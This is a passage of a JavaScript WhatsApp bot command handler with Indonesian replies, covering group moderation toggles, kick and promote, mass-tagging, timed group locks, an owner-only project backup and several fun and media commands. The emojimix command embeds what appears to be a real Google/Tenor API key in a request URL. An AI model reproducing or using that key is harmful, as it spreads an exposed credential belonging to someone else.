        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }
break  
case "backupsc":
case "bck":
case "backup": { 
    if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber)
        return m.reply(mess.owner);
    try {
        const tmpDir = "./library/database/Sampah";
        if (fs.existsSync(tmpDir)) {
            const files = fs.readdirSync(tmpDir).filter(f => !f.endsWith(".js"));
            for (let file of files) {
                fs.unlinkSync(`${tmpDir}/${file}`);
            }
        }

        await m.reply("Processing Backup Script . .");

        const name = `${namaBot.replace(/\s+/g, "_")}_Version${version.replace(/\s+/g, "_")}`;
        const exclude = ["node_modules", "Session", "package-lock.json", "yarn.lock", ".npm", ".cache"];
        const filesToZip = fs.readdirSync(".").filter(f => !exclude.includes(f) && f !== "");

        if (!filesToZip.length) return m.reply("Tidak ada file yang dapat di-backup.");

        console.log("Files to zip:", filesToZip);
        execSync(`zip -r ${name}.zip ${filesToZip.join(" ")}`);

        if (!fs.existsSync(`./${name}.zip`)) return m.reply("Gagal membuat file ZIP.");

        await sock.sendMessage(m.sender, {
            document: fs.readFileSync(`./${name}.zip`),
            fileName: `${name}.zip`,
            mimetype: "application/zip"
        }, { quoted: m });

        fs.unlinkSync(`./${name}.zip`);

        if (m.chat !== m.sender) m.reply("Script bot berhasil dikirim ke private chat.");
    } catch (err) {
        console.error("Backup Error:", err);
        m.reply("Terjadi kesalahan saat melakukan backup.");
    }
}
break;

/*
     GROUP
*/
case 'antilinkall': {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (args[0] === 'on') {
        if (setting.Antilinkall) return m.reply('Sudah diaktifkan sebelumnya')
        setting.Antilinkall = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.Antilinkall) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.Antilinkall = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }

break            
            

case 'antilink4':
case 'antilinkig': {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[0] === 'on') {
        if (setting.Antilinkig) return m.reply('Sudah diaktifkan sebelumnya')
        setting.Antilinkig = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.Antilinkig) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.Antilinkig = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }

break               
case 'antilink3':
case 'antiwame': {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[0] === 'on') {
        if (setting.antiWame) return m.reply('Sudah diaktifkan sebelumnya')
        setting.antiWame = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.antiWame) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.antiWame = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }

break               
case 'antilink2':
case 'antilinkch': {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[0] === 'on') {
        if (setting.Antilinkch) return m.reply('Sudah diaktifkan sebelumnya')
        setting.Antilinkch = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.Antilinkch) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.Antilinkch = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }
break               
case 'antilink':
case 'antilinkgc': {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[0] === 'on') {
        if (setting.Antilinkgc) return m.reply('Sudah diaktifkan sebelumnya')
        setting.Antilinkgc = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.Antilinkgc) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.Antilinkgc = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }

break      
case 'antijudol': {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (args[0] === 'on') {
        if (setting.antijudol) return m.reply('Sudah diaktifkan sebelumnya')
        setting.antijudol = true
        setting.antijudol2 = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.antijudol) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.antijudol = false
        setting.antijudol2 = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }

break 
case 'delete':
			case 'd':
			case 'del': {
			
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

				if (!m.quoted) return reply('Kak, kamu perlu mengirim pesan yang mau dihapus ya! 🤔')
				await sock.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						id: m.quoted.id,
						participant: m.quoted.sender
					}
				})
			}
			break
			 case'dor': case "kick": case "kik": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await sock.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await sock.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply("@tag/reply")
}
}

break
case "linkgc": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

const urlGrup = "https://chat.whatsapp.com/" + await sock.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await sock.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}

break
case "resetlinkgc": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

await sock.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}

break
case "totag":{
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
 let users = participants.map(u => u.id).filter(v => v !== sock.user.jid)
 if (!m.quoted) return reply(`✳️ Reply to a message`)
 sock.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: users } )
}
break
case 'closetime':

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
 reply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
sock.groupSettingUpdate(from, 'announcement')
reply(close)
}, timer)
break

case "opentime": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')
}
reply(`Open Time ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
const nomor = m.participant
const open = `*Tepat Waktu* Grup Dibuka Oleh Admin\nSekarang Member Dapat Mengirim Pesan`
sock.groupSettingUpdate(m.chat, 'not_announcement')
reply(open)
}, timer)
}

break


case "demote":
case "promote": {

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await sock.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await sock.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply("@tag/6285###")
}
}

break
case 'delppgc':{

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

await sock.removeProfilePicture(from)
}
break
case 'setppgc':

if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)

if (!/image/.test(mime)) return reply(`Send/Reply Image Caption Caption ${cmd}`)
if (/webp/.test(mime)) return reply(`Kirim/Balas Gambar Dengan Caption ${cmd}`)
var medis = await sock.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (text == 'full') {
var {
img
} = await generateProfilePicture(medis)
await sock.query({
tag: 'iq',
attrs: {
to: m.chat,
type: 'set',
xmlns: 'w:profile:picture'
},
content: [{
tag: 'picture',
attrs: {
type: 'image'
},
content: img
}]
})
fs.unlinkSync(medis)
reply(mess.done)
} else {
var memeg = await sock.updateProfilePicture(m.chat, {
url: medis
})
fs.unlinkSync(medis)
reply(mess.done)
}

break
case 'tagall':{
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
const textMessage = args.join(" ") || "nothing";
let teks = `tagall message :\n> *${textMessage}*\n\n`;
const groupMetadata = await sock.groupMetadata(m.chat);
const participants = groupMetadata.participants;
for (let mem of participants) {
teks += `@${mem.id.split("@")[0]}\n`;
}
sock.sendMessage(m.chat, {
text: teks,
mentions: participants.map((a) => a.id)
}, { quoted: m });
}
break         
case "h":
case "hidetag": {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (m.quoted) {
sock.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
sock.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, { quoted: m })
}
}
break 
case "closegc": case "close": 
case "opengc": case "open": {
if (!isGroup) return reply(mess.group);
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
if (/open|opengc/.test(command)) {
if (groupMetadata.announce == false) return 
await sock.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (groupMetadata.announce == true) return 
sock.groupSettingUpdate(m.chat, 'announcement')
} else {}
}

break        
case 'afk': {
if (!m.isGroup) return reply(mess.group);
 let reason = text ? text : 'Coli'

 // Cek kalau user udah afk
 if (afk.checkAfkUser(m.sender, _afk)) {
 return reply('Kan udah tadi😠.')
 }

 let obj = {
 id: m.sender,
 time: Date.now(),
 reason
 }
 _afk.push(obj)
 fs.writeFileSync('./lib/database/user.json', JSON.stringify(_afk))

 sock.sendMessage(m.chat, {text:`@${m.sender.split("@")[0]} menghilang dari lane\n\n*Reason:* ${reason}`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
break;         

/*
    OTHER
*/
case 'getpaste':
case 'pastebin':
case 'getpb': {
    if (!text || !text.includes('pastebin.com')) {
        return reply(`⚠️ Masukkan link Pastebin yang valid!\n\nContoh: ${cmd} https://pastebin.com/Gu8RZaqv`);
    }
 
    // Kirim pesan loading dan simpan key-nya
    const statusMsg = await sock.sendMessage(m.chat, { text: '⏳ Sedang mengambil konten dari Pastebin...' }, { quoted: m });
    const key = statusMsg.key;
 
    try {
        const apiUrl = `https://zelapioffciall.koyeb.app/tools/pastebin?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);
 
        if (!data.status || !data.content) {
            throw new Error('Gagal mengambil konten dari link tersebut.');
        }
 
        const lineCount = data.content.split('\n').length;
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
        const caption = `
✅ *Konten Pastebin Berhasil Diambil:*
 
🕹 ID: ${data.paste_id}
📆 Waktu: ${timestamp}
📝 Jumlah Baris: ${lineCount}
━━━━━━━━━━━━━━━━━━━━━
${data.content}
        `.trim();
        
        // Edit pesan loading menjadi pesan sukses
        await sock.sendMessage(m.chat, { text: caption, edit: key });
 
    } catch (error) {
        console.error('Error di fitur getpaste:', error);
        const errorCaption = `❌ Terjadi kesalahan: ${error.message}`;
        // Edit pesan loading menjadi pesan error
        await sock.sendMessage(m.chat, { text: errorCaption, edit: key });
    }
}
break;
case 'bfstock':
case 'bloxfruitstock': {
    reply('🍓 Sedang mengambil data stok terbaru dari Blox Fruits...');
 
    try {
        const apiUrl = 'https://www.gamersberg.com/api/blox-fruits/stock';
        const { data } = await axios.get(apiUrl);
 
        let stockData, lastUpdate;
 
        if (data && data.data && data.data.length > 0) {
            stockData = data.data[0];
            lastUpdate = new Date(data.meta.lastUpdateTime * 1000).toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });
        } else if (data && data.stock) {
            stockData = data.stock;
            lastUpdate = new Date(data.stock.updated).toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });
        } else {
            throw new Error('Format API tidak dikenal atau data kosong.');
        }
        
        const normalStock = stockData.normalStock || stockData.normal;
        const mirageStock = stockData.mirageStock || stockData.mirage;
 
        const emojiMap = { "Rocket": "🚀", "Spin": "🌪️", "Chop": "⚔️", "Spring": "🌀", "Bomb": "💣", "Smoke": "💨", "Spike": "🌵", "Flame": "🔥", "Falcon": "🦅", "Ice": "❄️", "Sand": "⏳", "Dark": "🌑", "Diamond": "💎", "Light": "💡", "Rubber": "🎈", "Barrier": "🧱", "Ghost": "👻", "Magma": "🌋", "Quake": "💥", "Buddha": "🧘", "Love": "❤️", "Spider": "🕷️", "Sound": "🎵", "Phoenix": "🔥", "Portal": "🌀", "Rumble": "⚡", "Pain": "🐾", "Blizzard": "🌨️", "Gravity": "☄️", "Mammoth": "🐘", "T-Rex": "🦖", "Dough": "🍩", "Shadow": "👤", "Venom": "☠️", "Control": "🕹️", "Spirit": "👻", "Dragon": "🐉", "Leopard": "🐆", "Kitsune": "🦊", "Blade": "⚔️", "Eagle": "🦅", "Creation": "✨" };
        const formatFruitName = (name) => {
            const parts = name.split('-');
            if (parts.length === 2 && parts[0] === parts[1]) return parts[0];
            return name.replace(/-/g, ' ');
        };
        const formatCategory = (title, emojiHeader, items) => {
            if (!items || items.length === 0) return `*${emojiHeader} ${title}:*\n- Stok tidak tersedia.\n\n`;
            let text = `${emojiHeader} *${title}*\n`;
            text += items.map(item => {
                const name = formatFruitName(item.name);
                const emoji = emojiMap[name] || '❔';
                return `- ${emoji} ${name} (💲${item.price.toLocaleString('id-ID')})`;
            }).join('\n');
            return text + '\n\n';
        };
 
        let replyText = `*🍓 Stok Buah Blox Fruits (Update: ${lastUpdate} WIB)*\n\n`;
        replyText += formatCategory('Normal Stock', '🏪', normalStock);
        replyText += formatCategory('Mirage Stock', '🏝️', mirageStock);
 
        reply(replyText.trim());
 
    } catch (error) {
        console.error('Error di fitur bfstock:', error);
        reply(`❌ Terjadi kesalahan saat mengambil data stok Blox Fruits.`);
    }
}

break;
//============ Sad
    case 'sad1':
    case 'sad2':
    case 'sad3':
    case 'sad4':
    case 'sad5':
    case 'sad6':
    case 'sad7':
    case 'sad8':
    case 'sad9':
    case 'sad10':
    case 'sad11':
    case 'sad12':
    case 'sad13':
    case 'sad14':
    case 'sad15':
    case 'sad16':
    case 'sad17':
    case 'sad18':
    case 'sad19':
    case 'sad20':
    case 'sad21':
    case 'sad22':
    case 'sad23':
    case 'sad24':
    case 'sad25':
    case 'sad26':
    case 'sad27':
    case 'sad28':
    case 'sad29':
    case 'sad30':
    case 'sad31':
    case 'sad32':
    case 'sad33':
    case 'sad34':
    case 'sad35':
    case 'sad36':
    case 'sad37':
    case 'sad38':
    case 'sad39':
    case 'sad40':
    case 'sad41':
    case 'sad42':
    case 'sad43':
    case 'sad44':
    case 'sad45':
    case 'sad46':
    case 'sad47':
    case 'sad48':
    case 'sad49':
    case 'sad50':
    case 'sad51':
    case 'sad52':
    case 'sad53':
    case 'sad54':
    case 'sad55': {
      try {
        let link = `https://raw.githubusercontent.com/Leoo7z/Music/main/sad-music/${command}.mp3`
        await sock.sendMessage(m.chat, {
          audio: {
            url: link
          },
          mimetype: 'audio/mpeg'
        }, {
          quoted: m
        })
      } catch (err) {
        m.reply(`Terjadi kesalahan: ${err}`)
      }
    }
    break
    case 'sound1':
    case 'sound2':
    case 'sound3':
    case 'sound4':
    case 'sound5':
    case 'sound6':
    case 'sound7':
    case 'sound8':
    case 'sound9':
    case 'sound10':
    case 'sound11':
    case 'sound12':
    case 'sound13':
    case 'sound14':
    case 'sound15':
    case 'sound16':
    case 'sound17':
    case 'sound18':
    case 'sound19':
    case 'sound20':
    case 'sound21':
    case 'sound22':
    case 'sound23':
    case 'sound24':
    case 'sound25':
    case 'sound26':
    case 'sound27':
    case 'sound28':
    case 'sound29':
    case 'sound30':
    case 'sound31':
    case 'sound32':
    case 'sound33':
    case 'sound34':
    case 'sound35':
    case 'sound36':
    case 'sound37':
    case 'sound38':
    case 'sound39':
    case 'sound40':
    case 'sound41':
    case 'sound42':
    case 'sound43':
    case 'sound44':
    case 'sound45':
    case 'sound46':
    case 'sound47':
    case 'sound48':
    case 'sound49':
    case 'sound50':
    case 'sound51':
    case 'sound52':
    case 'sound53':
    case 'sound54':
    case 'sound55':
    case 'sound56':
    case 'sound57':
    case 'sound58':
    case 'sound59':
    case 'sound60':
    case 'sound61':
    case 'sound62':
    case 'sound63':
    case 'sound64':
    case 'sound65':
    case 'sound66':
    case 'sound67':
    case 'sound68':
    case 'sound69':
    case 'sound70':
    case 'sound71':
    case 'sound72':
    case 'sound73':
    case 'sound74':
    case 'sound75':
    case 'sound76':
    case 'sound77':
    case 'sound78':
    case 'sound79':
    case 'sound80':
    case 'sound81':
    case 'sound82':
    case 'sound83':
    case 'sound84':
    case 'sound85':
    case 'sound86':
    case 'sound87':
    case 'sound88':
    case 'sound89':
    case 'sound90':
    case 'sound91':
    case 'sound92':
    case 'sound93':
    case 'sound94':
    case 'sound95':
    case 'sound96':
    case 'sound97':
    case 'sound98':
    case 'sound99':
    case 'sound100':
    case 'sound101':
    case 'sound102':
    case 'sound103':
    case 'sound104':
    case 'sound105':
    case 'sound106':
    case 'sound107':
    case 'sound108':
    case 'sound109':
    case 'sound110':
    case 'sound111':
    case 'sound112':
    case 'sound113':
    case 'sound114':
    case 'sound115':
    case 'sound116':
    case 'sound117':
    case 'sound118':
    case 'sound119':
    case 'sound120':
    case 'sound121':
    case 'sound122':
    case 'sound123':
    case 'sound124':
    case 'sound125':
    case 'sound126':
    case 'sound127':
    case 'sound128':
    case 'sound129':
    case 'sound130':
    case 'sound131':
    case 'sound132':
    case 'sound133':
    case 'sound134':
    case 'sound135':
    case 'sound136':
    case 'sound137':
    case 'sound138':
    case 'sound139':
    case 'sound140':
    case 'sound141':
    case 'sound142':
    case 'sound143':
    case 'sound144':
    case 'sound145':
    case 'sound146':
    case 'sound147':
    case 'sound148':
    case 'sound149':
    case 'sound150':
    case 'sound151':
    case 'sound152':
    case 'sound153':
    case 'sound154':
    case 'sound155':
    case 'sound156':
    case 'sound157':
    case 'sound158':
    case 'sound159':
    case 'sound160':
    case 'sound161':
    case 'sound162':
    case 'sound163':
    case 'sound164':
    case 'sound165':
    case 'sound166':
    case 'sound167':
    case 'sound168':
    case 'sound169':
    case 'sound170':
    case 'sound171':
    case 'sound172':
    case 'sound173':
    case 'sound174':
    case 'sound175':
    case 'sound176':
    case 'sound177':
    case 'sound178':
    case 'sound179':
    case 'sound180':
    case 'sound181':
    case 'sound182':
    case 'sound183':
    case 'sound184':
    case 'sound185':
    case 'sound186':
    case 'sound187':
    case 'sound188':
    case 'sound189':
    case 'sound190':
    case 'sound191':
    case 'sound192':
    case 'sound193':
    case 'sound194':
    case 'sound195':
    case 'sound196':
    case 'sound197':
    case 'sound198':
    case 'sound199':
    case 'sound200':
    case 'sound201':
    case 'sound202':
    case 'sound203':
    case 'sound204':
    case 'sound205':
    case 'sound206':
    case 'sound207':
    case 'sound208':
    case 'sound209':
    case 'sound210':
    case 'sound211':
    case 'sound212':
    case 'sound213':
    case 'sound214':
    case 'sound215':
    case 'sound216':
    case 'sound217':
    case 'sound218':
    case 'sound219':
    case 'sound220':
    case 'sound221':
    case 'sound222':
    case 'sound223':
    case 'sound224':
    case 'sound225':
    case 'sound226':
    case 'sound227':
    case 'sound228':
    case 'sound229':
    case 'sound230':
    case 'sound231':
    case 'sound232':
    case 'sound233':
    case 'sound234':
    case 'sound235':
    case 'sound236':
    case 'sound237':
    case 'sound238':
    case 'sound239':
    case 'sound240':
    case 'sound241':
    case 'sound242':
    case 'sound243':
    case 'sound244':
    case 'sound245':
    case 'sound246':
    case 'sound247':
    case 'sound248':
    case 'sound249':
    case 'sound250': {
try {
        let link = `https://raw.githubusercontent.com/Leoo7z/Music/main/${command}.mp3`
        await sock.sendMessage(m.chat, {
          audio: {
            url: link
          },
          mimetype: 'audio/mpeg',
          contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
        }, {
          quoted: m
        })
      } catch (err) {
        m.reply(`Terjadi kesalahan: ${err}`)
      }
    }
    break
case 'emojimix': {
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return reply(`\n*Penggunaan Salah!*\nKetik .emojimix 😄+😏\n`)
if (!emoji2) return reply(`\n*Penggunaan Salah!*\nKetik .emojimix 😄+😏\n`)
reply("Proses...")
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await sock.sendImageAsSticker(m.chat, res.url, m, {
packname: namaBot,
author: namaBot,
categories: res.tags,
contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
})
await fs.unlinkSync(encmedia)
}
 
}

break 
case "tourl2": {
  if (!quoted) return reply(`Fotonya Mana?`)
if (!/image|video|audio/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${cmd}`)
reply("Tunggu sebentar...")
let media = await sock.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
await sock.sendMessage(m.chat, {
    interactiveMessage: {
      title: response,
      footer: "© "+namaBot,
      thumbnail: thumbnail,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "© "+namaBot,
            url: "t.me/zion209",
            copy_code: `Uptime : ${runtime(process.uptime())}`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "© "+namaBot,
            button_title: "© "+namaBot
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/sh3nnmine",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
      {
        "name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Url\",\"id\":\"${response}\",\"copy_code\":\"${response}\"}`

          }
        ]
      }
    }
  },
  { quoted: m });
  }
  break
case 'rbg':
case 'removebg':
case 'nobg': {
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Sabar wir!!.. 😇🫵');
 
    let mediaPath = null;
    try {
        mediaPath = await sock.downloadAndSaveMediaMessage(q);
        if (!mediaPath) throw new Error("Gagal mengunduh gambar.");
 
        const imageUrl = await CatBox(mediaPath);
        if (!imageUrl) throw new Error("Gagal mengunggah gambar ke server perantara.");
        
        const apiUrl = `https://kyyokatsurestapi.my.id/tools/removebg?url=${imageUrl}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: m });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
